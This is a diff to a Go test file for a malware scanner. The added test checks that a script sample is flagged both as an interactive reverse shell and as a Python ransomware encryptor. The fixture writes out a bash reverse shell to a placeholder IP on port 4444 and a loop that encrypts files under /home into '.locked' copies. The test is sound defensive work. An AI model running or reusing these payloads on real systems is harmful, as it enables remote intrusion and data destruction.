@@ -614,3 +614,57 @@ func TestCheckTrojanedPackageBinary(t *testing.T) {
 		t.Errorf("expected nil for matching kernel image, got: %+v", mBootMatch)
 	}
 }
+
+func TestCheckAllSuspiciousScriptContent_MultipleMatches(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+
+	// A multi-stage threat containing both an interactive reverse shell and ransomware encryption
+	multiThreatPayload := []byte(`#!/bin/bash
+# Stage 1: Call back home
+bash -i >& /dev/tcp/198.51.100.1/4444 0>&1
+
+# Stage 2: Encrypt victim files
+python3 -c "
+import os
+from Crypto.Cipher import AES
+for root, dirs, files in os.walk('/home'):
+    for f in files:
+        cipher = AES.new(b'0123456789abcdef', AES.MODE_CBC)
+        with open(os.path.join(root, f) + '.locked', 'wb') as out:
+            out.write(cipher.encrypt(b'victim data...'))
+"
+`)
+
+	matches := scanner.CheckAllSuspiciousScriptContent("/tmp/multi_implant.sh", multiThreatPayload, nil, cfg)
+	if len(matches) < 2 {
+		t.Fatalf("expected at least 2 distinct heuristic matches, got %d", len(matches))
+	}
+
+	foundRevShell := false
+	foundRansomware := false
+	for _, m := range matches {
+		if m.Name == "Script_Reverse_Shell_Interactive" {
+			foundRevShell = true
+		}
+		if m.Name == "Script_Python_Ransomware_Encryptor" {
+			foundRansomware = true
+		}
+	}
+
+	if !foundRevShell {
+		t.Errorf("expected Script_Reverse_Shell_Interactive among matches")
+	}
+	if !foundRansomware {
+		t.Errorf("expected Script_Python_Ransomware_Encryptor among matches")
+	}
+
+	// Single-match backward-compatible wrapper should return the highest severity/score match
+	single := scanner.CheckSuspiciousScriptContent("/tmp/multi_implant.sh", multiThreatPayload, nil, cfg)
+	if single == nil {
+		t.Fatalf("expected non-nil from CheckSuspiciousScriptContent")
+	}
+	if single.Score < 90 {
+		t.Errorf("expected top score >= 90, got %d", single.Score)
+	}
+}
+
